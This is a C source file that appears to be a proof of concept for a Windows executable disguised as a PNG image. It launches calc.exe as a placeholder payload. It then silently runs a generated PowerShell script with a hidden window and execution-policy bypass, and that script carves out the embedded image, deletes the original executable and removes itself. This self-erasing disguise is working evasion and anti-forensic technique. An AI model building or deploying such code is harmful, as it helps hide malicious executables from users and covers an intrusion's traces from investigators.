#include <windows.h>
#include <stdio.h>
#include <stdlib.h> 


int scheduleModification() {
    char exePath[MAX_PATH];
    FILE *script;

    if (GetModuleFileName(NULL, exePath, MAX_PATH) == 0) {
        perror("Error getting exe path");
        return 1;
    }

    script = fopen("modify_delayed.ps1", "w");
    if (script == NULL) {
        perror("Error creating PowerShell script");
        return 1;
    }

    fprintf(script, "# Wait for process to exit\n");
    fprintf(script, "Start-Sleep -Seconds 3\n\n");

    // Load EXE/Polyglot bytes
    fprintf(script, "$exePath = '%s'\n", exePath);
    fprintf(script, "$bytes = [System.IO.File]::ReadAllBytes($exePath)\n");

    // Find embedded PNG header (0x89 50 4E 47)
    fprintf(script, "$pngOffset = -1\n");
    fprintf(script, "for ($i=0; $i -lt $bytes.Length-8; $i++) {\n");
    fprintf(script, "    if ($bytes[$i] -eq 0x89 -and $bytes[$i+1] -eq 0x50 -and $bytes[$i+2] -eq 0x4E -and $bytes[$i+3] -eq 0x47) {\n");
    fprintf(script, "        $pngOffset = $i; break\n");
    fprintf(script, "    }\n");
    fprintf(script, "}\n\n");

    // If found, slice PNG data and overwrite same file, then rename
    fprintf(script, "if ($pngOffset -ge 0) {\n");
    fprintf(script, "    $png = $bytes[$pngOffset..($bytes.Length-1)]\n");
    fprintf(script, "    $pngPath = [System.IO.Path]::ChangeExtension($exePath, '.png')\n");
    fprintf(script, "    [System.IO.File]::WriteAllBytes($pngPath, $png)\n");
    fprintf(script, "    Remove-Item $exePath\n");
    fprintf(script, "    Write-Host \"Converted to PNG: $pngPath\"\n");
    fprintf(script, "} else {\n");
    fprintf(script, "    Write-Host 'No PNG header found in file.'\n");
    fprintf(script, "}\n\n");

    // Cleanup
    fprintf(script, "Remove-Item 'modify_delayed.ps1'\n");

    fclose(script);

    // Run script in background
    system("start /B powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File modify_delayed.ps1");

    printf("Scheduled PNG self-rewrite + rename after program exits...\n");
    return 0;
}

int main() {
    // MessageBoxA(NULL, "Hello from Polyglot EXE!", "Polyglot Demo", MB_OK);
    // Execute the "calc.exe" command to open the Windows Calculator
    system("calc.exe"); 

    // Schedule PNG overwrite & rename after exit
    scheduleModification();

    return 0;
}
